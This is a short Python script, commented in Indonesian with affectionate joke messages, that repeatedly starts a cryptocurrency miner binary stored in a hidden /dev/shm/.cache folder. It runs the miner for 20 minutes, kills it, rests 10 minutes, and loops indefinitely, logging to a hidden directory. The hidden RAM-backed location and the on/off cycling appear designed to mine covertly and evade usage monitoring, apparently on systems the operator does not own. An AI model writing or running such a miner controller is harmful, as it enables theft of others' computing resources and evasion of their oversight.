import os
import time
import psutil
import sys

# CONFIG
MINER_NAME = "/dev/shm/.cache/tobrut"  # Lokasi miner kamu
MINING_TIME = 1200  # 20 menit
REST_TIME = 600  # 10 menit
LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"

def get_pid(name):
    for proc in psutil.process_iter(['pid', 'cmdline']):
        try:
            cmdline = " ".join(proc.info['cmdline']) if proc.info['cmdline'] else ""
            if name in cmdline:
                return proc.pid
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

def kill_miner():
    pid = get_pid("tobrut")
    if pid:
        print(f"🔥 Sayang, aku kill PID {pid} buat kasih dia istirahat biar gak double mining...")
        os.system(f"kill {pid}")
        sys.stdout.flush()
    else:
        print("💔 Tidak ada miner yang jalan, sayang...")

def start_miner():
    print("🚀 Menjalankan Panen buat rumah impian kita di Dubai...")
    os.system(f"nohup {MINER_NAME} > {LOG_PATH} 2>&1 &")
    sys.stdout.flush()

def main():
    while True:
        print("⛏️ Panen selama 20 menit buat beli iPhone 15 Pro Max buat kamu...")
        start_miner()
        time.sleep(MINING_TIME)

        print("💔 Mesin udah capek, aku kill dulu ya sayang...")
        kill_miner()

        print("😴 Istirahat dulu 10 menit biar hash kita fresh buat masa depan kita...")
        time.sleep(REST_TIME)

if __name__ == "__main__":
    print("💓 Cinta Abadi v4 Jalan Sayangku...")
    sys.stdout.flush()
    main()
